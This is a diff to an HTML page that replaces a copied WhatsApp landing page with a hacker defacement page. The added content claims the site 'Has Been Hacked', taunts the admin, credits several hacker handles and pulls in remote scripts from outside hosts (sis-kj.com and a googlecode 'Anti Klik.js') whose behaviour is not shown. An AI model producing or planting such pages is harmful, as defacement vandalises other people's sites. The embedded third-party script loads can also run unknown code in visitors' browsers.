@@ -1,19 +1,88 @@
-<html lang="en" id="facebook" class=""><head><meta charset="utf-8"><meta name="referrer" content="origin-when-crossorigin" id="meta_referrer"><script>function envFlush(a){function b(b){for(var c in a)b[c]=a[c]}window.requireLazy?window.requireLazy(["Env"],b):(window.Env=window.Env||{},b(window.Env))}envFlush({"ajaxpipe_token":"AXhtJQm7bCxjOrII","timeslice_heartbeat_config":{"pollIntervalMs":33,"idleGapThresholdMs":60,"ignoredTimesliceNames":{"requestAnimationFrame":true,"Event listenHandler mousemove":true,"Event listenHandler mouseover":true,"Event listenHandler mouseout":true,"Event listenHandler scroll":true},"isHeartbeatEnabled":true,"isArtilleryOn":false},"shouldLogCounters":true,"timeslice_categories":{"react_render":true,"reflow":true},"sample_continuation_stacktraces":true,"khsh":"0`sj`e`rm`s-0fdu^gshdoer-0gc^eurf-3gc^eurf;1;enbtldou;fduDmdldourCxO`ld-2YLMIuuqSdptdru;qsnunuxqd;rdoe-0unjdojnx-0unjdojnx0-0gdubi^rdbsduOdv-0`sj`e`r-0q`xm`r-0StoRbs`qhof-0mhoj^q`xm`r","stack_trace_limit":30,"deferred_stack_trace_rate":1000,"timesliceBufferSize":5000,"show_invariant_decoder":false,"compat_iframe_token":"AQ562dIyQhxVtEXL","isCQuick":false});</script><style></style><script>__DEV__=0;CavalryLogger=window.CavalryLogger||function(a){this.lid=a,this.transition=!1,this.metric_collected=!1,this.is_detailed_profiler=!1,this.instrumentation_started=!1,this.pagelet_metrics={},this.events={},this.ongoing_watch={},this.values={t_cstart:window._cstart},this.piggy_values={},this.bootloader_metrics={},this.resource_to_pagelet_mapping={},this.initializeInstrumentation&&this.initializeInstrumentation()},CavalryLogger.prototype.setIsDetailedProfiler=function(a){this.is_detailed_profiler=a;return this},CavalryLogger.prototype.setTTIEvent=function(a){this.tti_event=a;return this},CavalryLogger.prototype.setValue=function(a,b,c,d){d=d?this.piggy_values:this.values;(typeof d[a]==="undefined"||c)&&(d[a]=b);return this},CavalryLogger.prototype.getLastTtiValue=function(){return this.lastTtiValue},CavalryLogger.prototype.setTimeStamp=CavalryLogger.prototype.setTimeStamp||function(a,b,c,d){this.mark(a);var e=this.values.t_cstart||this.values.t_start;e=d?e+d:CavalryLogger.now();this.setValue(a,e,b,c);this.tti_event&&a==this.tti_event&&(this.lastTtiValue=e,this.setTimeStamp("t_tti",b));return this},CavalryLogger.prototype.mark=typeof console==="object"&&console.timeStamp?function(a){console.timeStamp(a)}:function(){},CavalryLogger.prototype.addPiggyback=function(a,b){this.piggy_values[a]=b;return this},CavalryLogger.instances={},CavalryLogger.id=0,CavalryLogger.disableArtilleryOnUntilOffLogging=!1,CavalryLogger.getInstance=function(a){typeof a==="undefined"&&(a=CavalryLogger.id);CavalryLogger.instances[a]||(CavalryLogger.instances[a]=new CavalryLogger(a));return CavalryLogger.instances[a]},CavalryLogger.setPageID=function(a){if(CavalryLogger.id===0){var b=CavalryLogger.getInstance();CavalryLogger.instances[a]=b;CavalryLogger.instances[a].lid=a;delete CavalryLogger.instances[0]}CavalryLogger.id=a},CavalryLogger.now=function(){return window.performance&&performance.timing&&performance.timing.navigationStart&&performance.now?performance.now()+performance.timing.navigationStart:new Date().getTime()},CavalryLogger.prototype.measureResources=function(){},CavalryLogger.prototype.profileEarlyResources=function(){},CavalryLogger.getBootloaderMetricsFromAllLoggers=function(){},CavalryLogger.start_js=function(){},CavalryLogger.done_js=function(){};CavalryLogger.getInstance().setTTIEvent("t_domcontent");CavalryLogger.prototype.measureResources=function(a,b){if(!this.log_resources)return;var c="bootload/"+a.name;if(this.bootloader_metrics[c]!==void 0||this.ongoing_watch[c]!==void 0)return;var d=CavalryLogger.now();this.ongoing_watch[c]=d;"start_"+c in this.bootloader_metrics||(this.bootloader_metrics["start_"+c]=d);b&&!("tag_"+c in this.bootloader_metrics)&&(this.bootloader_metrics["tag_"+c]=b);if(a.type==="js"){c="js_exec/"+a.name;this.ongoing_watch[c]=d}},CavalryLogger.prototype.stopWatch=function(a){if(this.ongoing_watch[a]){var b=CavalryLogger.now(),c=b-this.ongoing_watch[a];this.bootloader_metrics[a]=c;var d=this.piggy_values;a.indexOf("bootload")===0&&(d.t_resource_download||(d.t_resource_download=0),d.resources_downloaded||(d.resources_downloaded=0),d.t_resource_download+=c,d.resources_downloaded+=1,d["tag_"+a]=="_EF_"&&(d.t_pagelet_cssload_early_resources=b));delete this.ongoing_watch[a]}return this},CavalryLogger.getBootloaderMetricsFromAllLoggers=function(){var a={};Object.values(window.CavalryLogger.instances).forEach(function(b){b.bootloader_metrics&&Object.assign(a,b.bootloader_metrics)});return a},CavalryLogger.start_js=function(a){for(var b=0;b<a.length;++b)CavalryLogger.getInstance().stopWatch("js_exec/"+a[b])},CavalryLogger.done_js=function(a){for(var b=0;b<a.length;++b)CavalryLogger.getInstance().stopWatch("bootload/"+a[b])},CavalryLogger.prototype.profileEarlyResources=function(a){for(var b=0;b<a.length;b++)this.measureResources({name:a[b][0],type:a[b][1]?"js":""},"_EF_")};CavalryLogger.getInstance().log_resources=true;CavalryLogger.getInstance().setIsDetailedProfiler(true);window.CavalryLogger&&CavalryLogger.getInstance().setTimeStamp("t_start");</script><noscript><meta http-equiv="refresh" content="0; URL=/?_fb_noscript=1" /></noscript><title id="pageTitle">WhatsApp</title><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"><meta name="theme-color" content="#1BA691"><meta name="msapplication-navbutton-color" content="#1BA691"><meta name="apple-mobile-web-app-capable" content="yes"><meta property="og:title" content="WhatsApp"><meta property="og:image" content="https://static.whatsapp.net/rsrc.php/v3/yO/r/FsWUqRoOsPu.png"><meta property="og:site_name" content="WhatsApp.com"><meta property="og:description" content="WhatsApp Messenger: More than 1 billion people in over 180 countries use WhatsApp to stay in touch with friends and family, anytime and anywhere. WhatsApp is free and offers simple, secure, reliable messaging and calling, available on phones all over the world."><meta property="description" content="WhatsApp Messenger: More than 1 billion people in over 180 countries use WhatsApp to stay in touch with friends and family, anytime and anywhere. WhatsApp is free and offers simple, secure, reliable messaging and calling, available on phones all over the world."><meta name="apple-mobile-web-app-status-bar-style" content="#1BA691"><meta name="mobile-web-app-capable" content="yes"><style>#hide_till_load{display: block !important;}</style><link rel="shortcut icon" href="https://static.whatsapp.net/rsrc.php/v3/yP/r/rYZqPCBaG70.png">
-<link type="text/css" rel="stylesheet" href="https://static.whatsapp.net/rsrc.php/v3/ym/l/0,cross/m5EbBKDbvyl.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="jQGcZ" crossorigin="anonymous">
-<link type="text/css" rel="stylesheet" href="https://static.whatsapp.net/rsrc.php/v3/y3/l/0,cross/YmKpYKzZROy.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="0LE0K" crossorigin="anonymous">
-<link type="text/css" rel="stylesheet" href="https://static.whatsapp.net/rsrc.php/v3/y_/l/0,cross/Zlfz3U38Elh.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="Q3/vz" crossorigin="anonymous">
-<link type="text/css" rel="stylesheet" href="https://static.whatsapp.net/rsrc.php/v3/yD/l/0,cross/5OLcUGVgbLb.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="6KFqn" crossorigin="anonymous">
-<link type="text/css" rel="stylesheet" href="https://static.whatsapp.net/rsrc.php/v3/yw/l/0,cross/-yb4jkN9h1U.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="5ThQo" crossorigin="anonymous">
+<html>
+<head>
+<title>Hacked by ./Clear Error</title>
+<link rel="SHORTCUT ICON" href="http://4umi.com/image/icon/smiley/disco.gif">
+<meta content='Hacked' name='description'/>
+<meta content='Stealth Cyber Army Corps.='keywords'/>
+<script type="text/javascript" src="http://www.sis-kj.com/js/3.js"></script>
+<body background =' # 'bgcolor='black'>
 
-</head><body class="_2yzz _2ywk _2yz- en chrome webkit win x1 Locale_en_GB" dir="ltr"><div id="hide_till_load" class="_2ywh" style="display: none"><div class="_2y_d _2yz-"><div class="_2zpg _2zrx"><header class="_2zpl _2zrx"><div class="_2yz3"><a class="_36or _2zq_" href="https://www.whatsapp.com/"></a></div><nav class="_2zc-" id="menu-drawer"><div class="_2zlb"><div class="_2zix" id="icon-drawer-close"><svg version="1.1" id="icon-close" xmlns="http://www.w3.org/1999/xlink" x="0" y="0" width="37" height="37" viewBox="0 0 37 37" style="enable-background:new 0 0 37 37;" space="preserve"><polygon class="_2y-e" points="26.7,11.6 25.4,10.3 18.5,17.2
-                  11.6,10.3 10.3,11.6 17.2,18.5
-                  10.3,25.4 11.6,26.7 18.5,19.8
-                  25.4,26.7 26.7,25.4 19.8,18.5 "></polygon></svg></div><div class="_2zlc"></div><ul class="_2z2n _2zo_"><li class="_2zp6"><a class="_36or _2zp7" href="https://www.whatsapp.com/download/">Download</a></li></select></li></ul></div></nav></header></div><div class="_2x11" id="u_0_0"><i class="_2x1t img sp_aP2YdYPpZaP sx_b4dd37" role="button" tabindex="0" id="u_0_1"><u>Close</u></i><div class="_2x10"><div class="_2x13"><p></p><p>California residents can learn more about their privacy rights in our <a class="_36or" href="/legal/ca-privacy-notice" rel="noopener">California Privacy Notice</a>.</p><p></p></div></div></div><div class="_2yyw _2yzf"><div class="_2yyk _2zmx"><div class="_2zmy"><h1 class="_2zmz"><p>Simple. Secure.<br>Reliable messaging.</p></h1><div class="_2zi1"><p>With WhatsApp, you'll get fast, simple, secure messaging and calling for <span class="">free<sup>*</sup>,</span> available on phones all over the world.</p></div><a class="_36or _2y_c _2z07 _2z0a _2zn9" href="https://www.whatsapp.com/download">Download now</a><div class="_2zn8"><sup>*</sup> Data charges may apply. Contact your provider for details.</div><div class="_2zn9 _2z2g"><ul><li><a class="_36or _36op" href="https://play.google.com/store/apps/details?id=com.whatsapp" target="_blank" rel="noopener"><img class="_36oq" src="https://static.whatsapp.net/rsrc.php/yE/r/TDpp7fh8s7a.svg"> Android</a></li><li><a class="_36or _36op" href="http://itunes.apple.com/us/app/whatsapp-messenger/id310633997?mt=8" target="_blank" rel="noopener"><img class="_36oq" src="https://static.whatsapp.net/rsrc.php/yX/r/QBqjMTNuxPz.svg"> iPhone</a></li><li><a class="_36or _36op" href="https://www.whatsapp.com/download"><img class="_36oq" src="https://static.whatsapp.net/rsrc.php/yk/r/w9G2-B0wRmZ.svg"> Mac or Windows PC</a></li></ul></div></div><div class="_2zm_"><div data-testid="whatsapp_www_hero_phone_image" class="_2zm2"></div></div></div></div><div class="_6jg3"><div class="_2y-f _2y-h"><div class="_2yz1"><div class="_2ywp"><div class="_2y-j" dir="auto">2020 © SaungTV.</div><div class="_2y-j _2y-k"><a class="_36or _2y-i" href="/">Privacy &amp; Terms</a></div></div></div></div></div></div></div>
+<script type='text/javascript'>
+var DADrightclicktheme = 'Dark';
+var DADrightclickimage = 'http://picturestack.com/44/578/hIHgembelzkaylR8.jpg';</script>
+<script type='text/javascript' src="http://tuyulz-blogspot.googlecode.com/files/Anti%20Klik.js"> </script>
+</head>
 
-<script>requireLazy(["InitialJSLoader"], function(InitialJSLoader) {InitialJSLoader.loadOnDOMContentReady(["l5ZhW","Ew3+H","Az4yj","DmA9I","6il\/R","EFU3W","EY9ij","26k26","WtwvR"]);});</script>
 
-<script>var bigPipe = new (require("BigPipe"))({"forceFinish":true,"config":null});</script>
-<script>bigPipe.beforePageletArrive("first_response")</script>
+<style>body{cursor: url(http://4umi.com/image/icon/smiley/disco.gif), progress !important;background:black repeat center;color:lime;} .kotak{text-align:center;background:transparant;border:solid lime
+2px;border-radius:15px;position:fixed;top:2px;left:390px;left:1px;right:1px;}.kotak1{text-align:center;background:transparant;border:solid lime 2px;border-radius:15px;position:fixed;bottom:2px;left:1px;right:1px;}</style><br/><br/>
 
-<script>bigPipe.beforePageletArrive("last_response")</script>
-</body></html>
+
+<div class="kotak">....::::::MR.Shxdxk Was Here::::::....</div><div class="kotak1"><blink>|"Security Is Just An Illusion--No System Is Safe"|</blink></div></center>
+
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+ <DIV align="center"><SPAN style="FILTER: blur(add=1,direction=170,strength=30); HEIGHT: 50px"> 
+    <STYLE> .layermensaje {
+        FONT-SIZE: 10pt;LINE-HEIGHT: 10pt; FONT-FAMILY: "Arial"}
+    </STYLE> 
+    <FONT style="FONT-SIZE: 20pt" face="Courier New"> 
+      <script type="text/javascript"> 
+        var charIndex = -1;
+        var stringLength = 0;
+        var inputText;
+        function writeContent(init)
+        {if(init)
+          { inputText = document.getElementById('contentToWrite').innerHTML; }if(charIndex==-1)
+          {charIndex = 0;stringLength = inputText.length;}var initString = document.getElementById('myContent').innerHTML;
+          initString = initString.replace(/<SPAN.*$/gi,"");
+          var theChar = inputText.charAt(charIndex);
+          var nextFourChars = inputText.substr(charIndex,4);
+          if(nextFourChars=='<BR>' || nextFourChars=='<br>')
+          {theChar  = '<BR>';charIndex+=3;}initString = initString + theChar + "<SPAN id='blink'>></SPAN>";
+          document.getElementById('myContent').innerHTML = initString;
+          charIndex = charIndex/1 +1;
+          if(charIndex%2==1)
+          { document.getElementById('blink').style.display='none';}else
+          {document.getElementById('blink').style.display='inline';}
+          if(charIndex<=stringLength)
+          {setTimeout('writeContent(false)',100);} else
+          {blinkSpan();}} var currentStyle = 'inline';function blinkSpan() {if(currentStyle=='inline')
+          {currentStyle='none';}else
+          {currentStyle='inline';} document.getElementById('blink').style.display = currentStyle;
+          setTimeout('blinkSpan()',400);} msg = ""; msg = " " + msg;pos = 0;function scrollMSG()
+        {document.title = msg.substring(pos, msg.length) + msg.substring(0, pos);
+          pos++;if (pos >  msg.length) pos = 0
+          window.setTimeout("scrollMSG()",100);}
+        scrollMSG();
+      </script> 
+            <td> 
+              <div id="myContent" class="tip"> </div> 
+              <div id="contentToWrite" style="display:none" text-decoration:"overline" class="tip">
+...Loading... <br/>
+...Sorry Admin...<br/>
+...Your Site Has Been Hacked...<br/>
+...Please Patch Your System Soon...<br/>
+...hahahhaahahah...<br/><br/>
+...I Came, I Saw, I Conguered...<br/><br/>
+.........../Hacked\Mr.Mush4f4 CH1C4G0..........<br/><br/>
+.........../Hacked\MR.SHDXK404.............</div>
+</td>
+</tr> 
+</table> 
+<p>&nbsp;</p> 
+
+<script type="text/javascript"> 
+writeContent(true);
+</script> 
+ 
+        
+
+
+</div></center><br /><br />
